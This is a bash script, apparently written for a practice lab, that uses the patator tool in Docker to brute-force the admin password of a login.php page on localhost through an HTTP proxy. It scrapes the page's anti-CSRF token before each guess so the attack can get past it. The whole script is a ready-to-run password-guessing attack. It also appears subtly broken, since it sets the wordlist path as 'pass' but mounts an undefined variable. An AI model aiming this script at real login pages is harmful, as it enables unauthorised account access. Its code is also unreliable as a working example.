#!/usr/bin/env bash

pass='/tmp/pass.txt'
url='http://127.0.0.1:8888/login.php'
ignore='Location: login.php'
before_egrep="_TOKEN_:<input type='hidden' name='user_token' value='(\w+)' />"
body='username=admin&password=FILE0&Login=Login&user_token=_TOKEN_'

docker run --rm -i -v $f:/F0 \
patator http_fuzz url=$url method=POST \
body="$body" 0=/F0 follow=0 accept_cookie=1 \
-x ignore:fgrep="$ignore" \
before_urls=$url before_egrep="$before_egrep"  \
proxy='172.16.195.1:8080' proxy_type='http'
